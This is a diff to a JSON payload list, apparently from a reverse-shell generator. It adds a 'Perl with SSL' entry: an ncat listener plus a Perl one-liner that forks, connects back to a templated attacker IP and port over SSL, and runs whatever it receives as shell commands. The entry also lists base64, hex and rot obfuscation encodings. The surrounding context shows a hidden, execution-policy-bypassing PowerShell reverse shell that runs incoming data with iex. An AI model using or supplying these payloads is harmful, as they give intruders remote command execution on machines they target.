@@ -222,6 +222,22 @@
         "note": "Test in Ubuntu 20.04.2"
     },
     {
+        "name": "Perl with SSL",
+        "listener_cmd": "ncat -l ${values.port} --ssl -v",
+        "command": "perl -e 'use IO::Socket::SSL;$p=fork;exit,if($p);$c=IO::Socket::SSL->new(PeerAddr=>\"${values.ip}:${values.port}\",SSL_verify_mode=>0);while(sysread($c,$i,8192)){syswrite($c,`$i`);}'",
+        "tags": [
+            "linux",
+            "mac",
+            "terminal"
+        ],
+        "oneliner": [
+            {"bash_b64": "command"},
+            {"bash_hex": "command"},
+            {"bash_rot": "command"}
+        ],
+        "note": "Test in Ubuntu 18.04.6"
+    },
+    {
         "name": "PowerShell #1",
         "payloadstr": "$client = New-Object System.Net.Sockets.TCPClient('${values.ip}',${values.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
         "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('${values.ip}',${values.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
